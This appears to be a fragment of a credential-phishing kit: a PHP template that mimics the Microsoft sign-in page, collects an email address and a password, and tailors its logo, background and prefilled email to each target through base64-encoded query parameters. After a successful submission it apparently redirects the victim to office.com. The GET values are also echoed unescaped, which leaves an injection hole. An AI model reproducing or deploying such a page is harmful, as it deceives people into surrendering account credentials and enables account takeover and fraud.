...
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true">
    ...
    <div>
        ...
        <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                ...
                <div id="bodybackground" class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="<?php 
    echo empty($_GET['bg']) ? 'background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)' : 'background : linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url(' . base64_decode($_GET['bg']) . ')';
    ?>">
                ...
                <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
                    ...
                    params: {
                        ...
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
                            ...
                            <img class="logo" id="logoCompany" role="presentation" data-bind="imgSrc" src="<?php 
    echo empty($_GET['logo']) ? 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd' : base64_decode($_GET['logo']);
    ?>">
                                ...
                                <div data-viewid="1">
                                    ...
                                    <div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
                                        ...
                                        <div class="row text-title" id="loginHeader" role="heading">
                                            <div aria-level="1" data-bind="text: title" id="titleBox">Sign in

                                            </div>
                                        </div>
                                        <div id="successLogin" style="display: none;">
                                            Do this to reduce the number of times you are asked to sign in.
                                            <div class="col-md-24 form-group checkbox" style="margin-top: 20px;">
                                                <label>
    ...
    externalCss: { 'button-field-container': true }">
                                                        ...
                                                        <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
                                                            ...
                                                            <input type="button" id="idSIButton99" class="button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                ...
                preventTabbing: primaryButtonPreventTabbing" aria-describedby="KmsiDescription" value="No">
                                                        </div>
                ...
                enable: isSecondaryButtonEnabled" value="Yes">
                                                        </div>
                                                        <!-- /ko -->
                                                    </div>
                                                </div>
                                    ...
                                    <div class="row">
                                        ...
                                        <div class="form-group col-md-24">
                                            ...
                                            <div class="placeholderContainer" id="emField">
                                                ...
                                                <input type="email" name="user" id="i0116" value="<?php 
    echo $_GET['id'] ?? '';
    ?>" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Email Address" aria-label="Enter your email address." required="" autofocus="true">
                                            ...
                                            <div class="placeholderContainer" id="pwField" style="display: none">
                                                ...
                                                <input required="true" type="password" name="pass" id="i0117" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Password" aria-label="Enter your password." autofocus="true">
            ...
            event: {
                menuOpen: actionLinks_onMenuOpen } }">
                                            ...
                                            <div class="row">
                                                <div class="col-md-24">
                                                    <div class="text-13 action-links">
                                                        ...
                                                        <div id="cantAccess" data-bind="css: { 'form-group': !isMenuLink(), 'action-links-menu-item': isMenuLink }" class="form-group">
                        ...
                        attr: { 'role': isMenuLink() ? 'menuitem' : null }">Can’t access your account?</a>
                                                        ...
                                                        <div id="createAccount" class="form-group" data-bind="
    ...
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }">
        ...
        css: {
            ...
            <input type="hidden" name="logo" id="logoForm" value="<?php 
    echo empty($_GET['logo']) ? '' : base64_decode($_GET['logo']);
    ?>">
            <input type="hidden" name="background" id="backgroundForm" value="<?php 
    echo empty($_GET['bg']) ? '' : base64_decode($_GET['bg']);
    ?>">
    ...
    <script>
        ...
        function isSuccess(email) {
            ...
            $('#i0281').attr('action', 'https://office.com/');
